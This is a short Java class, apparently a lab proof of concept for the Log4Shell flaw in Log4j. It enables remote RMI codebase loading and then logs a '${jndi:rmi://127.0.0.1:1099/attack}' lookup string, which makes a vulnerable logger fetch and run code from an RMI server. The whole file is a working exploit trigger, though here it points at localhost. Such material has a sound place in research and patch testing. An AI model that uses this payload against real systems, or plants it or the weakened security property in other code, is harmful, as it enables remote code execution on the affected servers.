package com.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Hello world!
 *
 */
public class Client {

    private static final Logger LOGGER = LogManager.getLogger();

    public static void main( String[] args) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        String msg = "${jndi:rmi://127.0.0.1:1099/attack}";
        LOGGER.info("message: {}", msg);
    }
}
